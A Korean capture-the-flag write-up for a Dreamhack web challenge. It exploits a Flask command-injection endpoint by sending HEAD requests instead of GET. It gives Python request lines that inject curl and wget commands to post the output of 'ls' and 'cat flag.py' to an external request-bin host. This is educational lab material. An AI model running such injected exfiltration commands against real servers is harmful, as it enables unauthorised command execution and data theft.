## 코드

```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd

app.run(host='0.0.0.0', port=8000)
```

## 풀이

코드가 일단 아주 간단하다. cmd 그대로 받아서 실행시키고 결과를 리턴하는 코드인데,
문제는 두가지이다.

1. os.system(cmd)의 결과를 웹에서 볼 수 없다.
2. request.method == 'GET'을 필터링한다.

즉 우리는 GET 메소드를 쓰지 않고, 명령어를 실행시켜서 이를 외부로 보내도록 처리해야 한다.
GET 메소드를 우회하기 위해서는 어떤 메소드가 사용가능한지 확인해봐야 하는데,
OPTIONS 메소드로 확인해보면 GET, HEAD, OPTIONS 메소드가 허용되어 있는 것을 알 수 있다. 

```python
import requests
res = requests.options('http://host3.dreamhack.games:9621)
> res.headers
> {'Content-Type': 'text/html; charset=utf-8', 'Allow': 'GET, OPTIONS, HEAD', 'Content-Length': '0', 'Server': 'Werkzeug/1.0.1 Python/3.7.7', 'Date': 'Tue, 22 Mar 2022 00:40:19 GMT'}
```

일단 외부로 보내는 방법은 다양한데, 대표적으로 curl, wget이 있다.
일반적으로 curl은 다운로드할 때 많이 사용하며, 우리는 curl 명령어를 실행시켜 flag 파일 정보를 외부로 보내야 한다.
외부 서버는 당연히 문제 서버와 연결돼야 하며, 자체 서버를 열기엔 번거로우니 드림핵의 requests bin 서버를 활용하면 된다.

```python
import requests
res2 = requests.head('http://host3.dreamhack.games:9621/?cmd=curl -F "file1=./flag.py" https://xskqaoq.request.dreamhack.games')
```

위와 같이 작성하면 문제서버/flag.py 파일을 드림핵 requests bin 서버에 보낼 수 있다.
만약 이게 우리 서버였다면 파일을 열어볼 수 있겠지만, 드림핵 서버는 파일 조회를 할 수 없다.
따라서 파일 자체를 보내기보단, 파일을 읽은 정보를 보내야 한다. => cat flag.py의 결과를 보내야 한다는 것
bash 명령어에서 "$(ls)"를 하면 ls 한 결과를 String으로 처리할 수 있다.
이 결과를 curl이나 wget을 통해 POST 방식으로 드림핵 requests bin 서버에 보내면 requests bin 응답의 body에서 해당 결과를 볼 수 있게 되는 것이다.

```python
import requests
res2 = requests.head('http://host3.dreamhack.games:9621/?cmd=wget --post-data="$(ls)" https://xskqaoq.request.dreamhack.games/')
res2 = requests.head('http://host3.dreamhack.games:9621/?cmd=curl https://wgvwluv.request.dreamhack.games/ -d "$(cat flag.py)"')
```

둘 중에 아무거나 사용하면 된다.
